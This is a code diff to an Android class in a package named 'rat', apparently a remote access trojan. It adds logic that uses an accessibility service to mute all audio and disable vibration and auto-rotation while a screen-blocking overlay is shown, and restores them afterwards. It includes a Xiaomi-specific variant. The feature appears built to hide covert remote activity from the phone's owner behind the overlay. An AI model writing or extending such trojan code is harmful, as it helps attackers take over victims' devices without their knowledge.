@@ -1,18 +1,18 @@
 package com.vendor.rat.helper;
 
-import android.graphics.PixelFormat;
-import android.os.Build;
+import android.content.ContentResolver;
+import android.content.Context;
+import android.media.AudioManager;
 import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
 import android.view.View;
 import android.view.WindowManager;
 
-import android.accessibilityservice.AccessibilityService;
-
 import com.vendor.rat.MainApplication;
 import com.vendor.rat.config.AppConfig;
 import com.vendor.rat.service.MyAccessibilityService;
+import com.vendor.rat.utils.DeviceUtils;
 
 import java.lang.ref.WeakReference;
 import java.util.concurrent.atomic.AtomicBoolean;
@@ -50,6 +50,9 @@ public abstract class BlockViewHelper {
     public static final AtomicBoolean destroyLock = new AtomicBoolean(true);
     public static final AtomicBoolean viewShowing = new AtomicBoolean(false);
 
+    /** 设备静音策略 — 按厂商选择不同实现 */
+    private static volatile DeviceMuteStrategy muteStrategy;
+
     /**
      * Show block view overlay. Vendor: g.a(BlockViewVO)
      * Returns true if block view is currently showing.
@@ -60,6 +63,18 @@ public abstract class BlockViewHelper {
                 ReentrantLock l = lock;
                 if (l.tryLock()) {
                     try {
+                        // 遮罩期间: 禁用自动旋转 + 关闭震动 + 静音
+                        try {
+                            MyAccessibilityService svc = MyAccessibilityService.getInstance();
+                            if (svc != null) {
+                                ContentResolver cr = svc.getContentResolver();
+                                AudioManager am = (AudioManager) svc.getSystemService(Context.AUDIO_SERVICE);
+                                getMuteStrategy().muteAll(cr, am);
+                            }
+                        } catch (Exception e) {
+                            Log.e(TAG, "muteAll error", e);
+                        }
+
                         // vendor: 判断是否在主线程，不在则 post 到主线程
                         if (Looper.myLooper() == Looper.getMainLooper()) {
                             createView(blockViewVO);
@@ -323,6 +338,8 @@ public abstract class BlockViewHelper {
                 ref.set(null);
                 viewShowing.set(false);
                 destroyLock.set(true);
+                // 遮罩移除后: 恢复自动旋转 + 震动 + 音量
+                restoreMuteStrategy();
                 Log.d(TAG, "BlockTextView 已从窗口移除");
             }
         } catch (Exception e) {
@@ -382,6 +399,7 @@ public abstract class BlockViewHelper {
             ref.set(null);
             viewShowing.set(false);
             destroyLock.set(true);
+            restoreMuteStrategy();
         } catch (Exception e) {
             Log.e(TAG, "removeViewSimple error", e);
         }
@@ -425,6 +443,34 @@ public abstract class BlockViewHelper {
             android.os.Message message = new android.os.Message();
             message.what = progress;
             bar.handler.sendMessage(message);
+        }
+    }
+
+    // ============ 设备静音策略 ============
+
+    private static DeviceMuteStrategy getMuteStrategy() {
+        if (muteStrategy == null) {
+            if (DeviceUtils.isXiaomi()) {
+                muteStrategy = new XiaomiMuteStrategy();
+            } else {
+                muteStrategy = new DefaultMuteStrategy();
+            }
+        }
+        return muteStrategy;
+    }
+
+    /**
+     * 恢复静音策略保存的设备状态
+     */
+    private static void restoreMuteStrategy() {
+        try {
+            MyAccessibilityService service = MyAccessibilityService.getInstance();
+            if (service == null) return;
+            ContentResolver resolver = service.getContentResolver();
+            AudioManager am = (AudioManager) service.getSystemService(Context.AUDIO_SERVICE);
+            getMuteStrategy().restoreAll(resolver, am);
+        } catch (Exception e) {
+            Log.e(TAG, "restoreMuteStrategy error", e);
         }
     }
 }
